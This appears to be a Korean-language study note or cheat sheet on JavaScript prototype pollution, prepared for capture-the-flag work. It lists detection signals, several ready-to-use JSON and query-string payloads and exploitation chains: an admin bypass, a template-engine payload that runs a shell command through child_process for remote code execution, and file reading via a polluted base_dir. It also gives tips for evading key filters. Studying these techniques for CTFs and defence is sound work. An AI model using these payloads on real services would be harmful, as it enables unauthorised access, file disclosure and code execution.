# Prototype Pollution (JavaScript)

## 개요
JavaScript 객체의 `__proto__` 프로퍼티를 통해 `Object.prototype`을 오염시켜
모든 객체에 임의 속성을 주입하는 공격.

## 탐지 시그널
- Node.js/Express 백엔드
- 사용자 입력이 객체의 key로 사용됨 (e.g., `obj[userInput] = value`)
- lodash `merge`, `set`, `defaultsDeep` 등 deep merge 함수 사용
- 경로 파라미터가 객체 속성으로 매핑됨

## 공격 벡터

### 1. 직접 __proto__ 접근
```json
POST /api/resource/__proto__
{ "isAdmin": true }
```

### 2. JSON body 오염
```json
{ "__proto__": { "isAdmin": true } }
```

### 3. Query string
```
?__proto__[isAdmin]=true
```

### 4. constructor.prototype
```json
{ "constructor": { "prototype": { "isAdmin": true } } }
```

## 활용 체인

### 세션/인증 바이패스
```javascript
// 서버: if (user.isAdmin) { ... }
// 공격: Object.prototype.isAdmin = true → 모든 유저가 admin
```

### Template Injection (RCE)
```json
// Handlebars, Pug, EJS 등
{ "__proto__": { "block": { "type": "Text", "line": "process.mainModule.require('child_process').execSync('id')" } } }
```

### LFI via base_dir 오염
```json
// GoN 2022 NSS 패턴
{ "__proto__": { "base_dir": "/etc", "expire": "999999999999" } }
```

## 방어 우회
- `__proto__` 필터링 → `constructor.prototype` 사용
- key 블랙리스트 → 인코딩/유니코드 변형 시도
- `Object.create(null)` 사용 시 → 공격 불가

## 참고
- GoN 2022 Q. NSS: prototype pollution + LFI로 flag 읽기
- https://portswigger.net/web-security/prototype-pollution
